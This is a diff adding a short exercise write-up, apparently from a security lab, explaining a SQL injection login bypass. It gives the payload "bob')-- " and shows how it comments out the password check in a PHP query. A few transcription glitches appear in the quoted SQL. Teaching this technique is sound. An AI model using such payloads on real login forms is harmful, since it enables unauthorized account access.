@@ -1,0 +1,20 @@
+login = "bob')-- "
+password "-"
+
+#Explanation
+The server will let us login whenever the sql_request returns true.
+The sql request is "SELECT ID, name, locale, lastlogin, gender,FROM USERS_TABLE 
+WHERE (name = '$user' OR email = '$user') AND pass = '$pass'"
+Therefore, if we can make that return TRUE we can login.
+The php code will insert exactly what we provide into $user and $pass.
+Since we are requested to log in as Bob:
+	1. Check if bob exists in database by using our admin account.
+	2. Just login using his name, NOT his password. Using "bob')-- " which will create this sql rrequest:
+	"SELECT ID, name, locale, lastlogin, gender,FROM USERS_TABLE
+  6 WHERE (name = 'bob')-- ' OR email = 'bob')-- ') AND pass = ''"
+	3. The '-- ' will comment everything after that in the sql request
+	4.The database will receive this request then:
+	"SELECT ID, name, locale, lastlogin, gender,FROM USERS_TABLE
+  6 WHERE (name = 'bob')"
+  	5.Since it only looks for matches of 'bob' and doesnt care about the password,
+		it returns TRUE and voilá we are logged in as bob.
